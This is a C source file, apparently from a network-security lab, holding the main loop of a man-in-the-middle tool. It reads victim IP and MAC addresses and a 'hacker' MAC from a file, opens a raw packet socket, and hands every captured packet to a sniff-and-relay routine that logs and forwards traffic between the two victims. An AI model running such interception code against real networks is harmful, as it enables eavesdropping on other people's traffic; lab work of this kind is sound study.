#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>

#include "util.h"
#include "sniff.h"

int main(int argc, char *argv[])
{
    int sock;

    char *interface     = malloc(sizeof(char) * 20);
    char *victim_ip_1   = malloc(sizeof(char) * 20);
    char *victim_ip_2   = malloc(sizeof(char) * 20);
    char *victim_mac_1  = malloc(sizeof(char) * 20);
    char *victim_mac_2  = malloc(sizeof(char) * 20);
    char *hacker_mac    = malloc(sizeof(char) * 20);

    // interface   = "eth0";
    // victim_ip_1 = "10.9.0.5";
    // victim_ip_2 = "10.9.0.6";
    // victim_mac_1 = "02:42:0a:09:00:05";
    // victim_mac_2 = "02:42:0a:09:00:06";
    // hacker_mac   = "02:42:0a:09:00:69";

    FILE *infofile = fopen("ipmacinfo","r");
    if(infofile == NULL) {
        printf("Unable to open ipmacinfo file.");
        return EXIT_FAILURE;
    }

    fscanf(infofile, "%s\n", interface);
    fscanf(infofile, "%s\n", hacker_mac);
    fscanf(infofile, "%s\n", victim_ip_1);
    fscanf(infofile, "%s\n", victim_ip_2);
    fscanf(infofile, "%s\n", victim_mac_1);
    fscanf(infofile, "%s\n", victim_mac_2);

    fclose(infofile);

    int saddr_size , data_size;
    struct sockaddr saddr;

    unsigned char *buffer = (unsigned char *) malloc(65536); //Its Big!

    FILE *logfile = fopen("snifflog","w");
    if(logfile == NULL) {
        printf("Unable to create log file.");
        return EXIT_FAILURE;
    }
    printf("Starting...\n");

    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        fprintf(stderr, "ERROR: Socket creation failed\n");
        return EXIT_FAILURE;
    }

    while(1) {
        saddr_size = sizeof saddr;
        // data_size = recv(sock, buffer, 65536, 0);
        data_size = recvfrom(sock, buffer, 65536, 0,
                             &saddr, (socklen_t*)&saddr_size);
        if(data_size < 0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            return 1;
        }
        sniff_and_relay(logfile, sock, buffer, data_size,
                        victim_ip_1, victim_mac_1,
                        victim_ip_2, victim_mac_2,
                        hacker_mac, interface);
    }
    close(sock);
    printf("Finished");
    return 0;
}
